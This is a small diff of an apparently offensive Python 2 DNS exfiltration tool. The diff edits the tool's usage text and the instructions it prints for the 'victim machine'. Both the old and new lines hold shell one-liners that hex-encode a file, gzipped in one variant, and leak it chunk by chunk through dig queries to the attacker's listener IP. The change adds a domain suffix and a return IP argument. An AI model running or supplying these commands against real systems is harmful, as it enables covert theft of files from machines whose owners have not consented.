@@ -59,7 +59,7 @@ if __name__ == '__main__':
   except:
 
     banner()
-    print "Usage: %s [listen_address]"
+    print "Usage: %s [listen_address] [return_ip]"
     exit(1)
 
   banner()
@@ -68,8 +68,8 @@ if __name__ == '__main__':
 
   print '\033[1;32m[+]\033[0m DNS listening on %s:53' % ip
   print "\033[1;32m[+]\033[0m Now on the victim machine, use the following command:"
-  print "\033[1;31m[#]\033[0m for b in $(xxd -p /path/to/file); do dig +short @%s $b.filename.ext ; done\nor" % ip
-  print "\033[1;31m[#]\033[0m for b in $(gzip -c /path/to/file | xxd -p); do dig +short @%s $b.filename.ext ; done ; dig +short @%s gunzip.filename.ext\n" % (ip, ip)
+  print "\033[1;31m[#]\033[0m for b in $(xxd -p /path/to/file); do dig +short @%s $b.filename.ext.domain.com ; done\nor" % ip
+  print "\033[1;31m[#]\033[0m for b in $(gzip -c /path/to/file | xxd -p); do dig +short @%s $b.filename.ext.domain.com ; done ; dig +short @%s gunzip.filename.ext.domain.com\n" % (ip, ip)
  
   while 1:
       
